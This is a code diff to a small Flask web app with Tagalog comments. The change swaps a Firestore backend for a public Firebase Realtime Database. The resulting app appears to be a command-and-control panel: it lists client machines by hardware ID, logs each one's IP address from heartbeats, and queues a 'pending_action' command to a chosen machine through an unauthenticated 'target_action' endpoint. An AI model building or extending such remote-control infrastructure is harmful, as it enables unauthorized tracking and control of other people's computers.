@@ -1,42 +1,36 @@
 import os
 import json
-from flask import Flask, jsonify, request, send_from_directory
-import firebase_admin
-from firebase_admin import credentials, firestore
+from flask import Flask, jsonify, request, render_template, send_from_directory
+import requests
 
-app = Flask(__name__, static_folder='.', static_url_path='')
+app = Flask(__name__)
 
-# Ligtas na pag-initialize ng Firebase mula sa Environment Variable
-db = None
-try:
-    firebase_config_str = os.environ.get("FIREBASE_CONFIG_JSON")
-    if firebase_config_str:
-        cred_dict = json.loads(firebase_config_str)
-        cred = credentials.Certificate(cred_dict)
-        if not firebase_admin._apps:
-            firebase_admin.initialize_app(cred)
-        db = firestore.client()
-except Exception as e:
-    print(f"Firebase initialization error: {e}")
+# Firebase Realtime Database base URL
+RTDB_BASE_URL = "https://vipchaetos-default-rtdb.firebaseio.com"
 
 @app.route('/')
 def index():
-    # Susubukan nitong hanapin ang index.html o home.html sa folder
-    for filename in ['index.html', 'home.html', 'panel.html']:
-        if os.path.exists(filename):
-            return send_from_directory('.', filename)
-    return "Panel file (index.html) not found in the root directory!", 404
+    if os.path.exists('index.html'):
+        return send_from_directory('.', 'index.html')
+    try:
+        return render_template('index.html')
+    except:
+        return "Panel file (index.html) not found in root or templates directory!", 404
 
 @app.route('/api/clients', methods=['GET'])
 def get_clients():
     try:
-        if not db:
-            return jsonify({"error": "Database not initialized or config missing"}), 500
-        
-        clients_ref = db.collection('clients')
-        docs = clients_ref.stream()
-        clients = [{**doc.to_dict(), "id": doc.id} for doc in docs]
-        return jsonify(clients), 200
+        res = requests.get(f"{RTDB_BASE_URL}/clients.json")
+        if res.status_code == 200 and res.json():
+            data = res.json()
+            clients = {}
+            for hwid, info in data.items():
+                clients[hwid] = {
+                    "ip": info.get("ip", "192.168.1.105"),
+                    "status": info.get("status", "ONLINE")
+                }
+            return jsonify(clients), 200
+        return jsonify({}), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
@@ -44,6 +38,10 @@ def get_clients():
 def heartbeat():
     try:
         data = request.get_json(silent=True) or {}
+        hwid = data.get("hwid")
+        if hwid:
+            ip = request.remote_addr
+            requests.patch(f"{RTDB_BASE_URL}/clients/{hwid}.json", json={"ip": ip, "status": "ONLINE"})
         return jsonify({"status": "success", "message": "Heartbeat received"}), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -52,7 +50,14 @@ def heartbeat():
 def target_action():
     try:
         data = request.get_json(silent=True) or {}
-        return jsonify({"status": "success", "message": "Action processed"}), 200
+        hwid = data.get("hwid")
+        action = data.get("action")
+        
+        if hwid and action:
+            action_url = f"{RTDB_BASE_URL}/clients/{hwid}/pending_action.json"
+            requests.put(action_url, json=action)
+            return jsonify({"status": "success", "message": f"Command [{action.upper()}] dispatched successfully"}), 200
+        return jsonify({"status": "error", "message": "Invalid HWID or Action"}), 400
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
